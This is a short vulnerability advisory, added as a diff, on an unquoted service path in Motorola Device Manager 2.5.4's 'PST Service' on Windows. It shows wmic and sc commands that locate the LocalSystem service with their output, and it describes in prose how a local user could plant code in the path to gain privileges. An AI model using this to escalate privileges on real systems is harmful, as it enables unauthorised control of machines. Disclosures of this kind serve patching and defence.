@@ -1,0 +1,40 @@
+# Exploit Title: Motorola Device Manager 2.5.4 - 'ForwardDaemon.exe 'Unquoted Service Path
+# Discovery by: Angel Canseco
+# Discovery Date: 2020-11-07
+# Vendor Homepage: https://motorola-device-manager.programas-gratis.net/gracias
+# Tested Version: 2.5.4
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Windows 10 Pro x64 es
+
+# Step to discover Unquoted Service Path:
+
+C:\>wmic service get name, pathname, displayname, startmode | findstr /i
+"Auto" | findstr /i /v "C:\Windows\\" | findstr /i "ForwardDaemon" |
+findstr /i /v """
+
+
+PST Service    C:\Program Files
+(x86)\Motorola\MotForwardDaemon\ForwardDaemon.exe
+Auto
+
+C:\Users\MISTI>sc qc "PST Service"
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: PST Service
+        TIPO               : 110  WIN32_OWN_PROCESS (interactive)
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files
+(x86)\Motorola\MotForwardDaemon\ForwardDaemon.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : PST Service
+        DEPENDENCIAS       : lanmanworkstation
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+#Exploit:
+
+A successful attempt would cause the local user to be able to insert their
+code in the system root path
+undetected by the OS or other security applications and elevate his
+privileges after reboot.
